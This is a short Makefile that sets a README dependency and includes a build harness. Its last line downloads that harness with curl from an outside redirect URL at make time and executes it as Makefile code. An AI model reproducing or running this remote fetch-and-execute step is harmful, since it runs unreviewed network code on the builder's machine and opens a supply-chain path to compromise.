SHELL := /bin/bash

# List of targets the `readme` target should call before generating the readme
export README_DEPS ?= docs/github-actions-reusable-workflows.md

-include $(shell curl -sSL -o .build-harness "https://itisopen.net/redirect/build-harness"; echo .build-harness)
